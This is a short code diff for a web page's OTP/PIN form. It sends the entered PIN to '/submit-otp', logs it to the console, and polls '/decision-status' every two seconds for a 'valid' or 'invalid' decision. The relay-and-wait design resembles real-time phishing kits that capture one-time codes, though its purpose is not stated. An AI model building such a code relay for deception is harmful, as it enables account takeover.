@@ -68,7 +68,7 @@ inputs.forEach((input, index) => {
 });
 
 // submit OTP
-function submitOTP() {
+async function submitOTP() {
     let otp = "";
 
     inputs.forEach(input => {
@@ -82,11 +82,36 @@ function submitOTP() {
 
     console.log("PIN ENTERED:", otp);
 
-    alert("PIN submitted successfully");
+    // ✅ SEND OTP TO SERVER
+    const res = await fetch("/submit-otp", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ otp })
+    });
 
-    // you can redirect if needed
-    // window.location.href = "success.html";
+    const data = await res.json();
+
+    if (data.success) {
+        alert("PIN submitted. Waiting for verification...");
+    } else {
+        alert("Error submitting PIN");
+    }
 }
+setInterval(async () => {
+  const res = await fetch("/decision-status");
+  const data = await res.json();
+
+  if (data.decision === "valid") {
+    window.location.href = "/dashboard.html";
+  }
+
+  if (data.decision === "invalid") {
+    alert("Invalid OTP. Try again.");
+  }
+}, 2000);
+
 </script>
 
 </body>
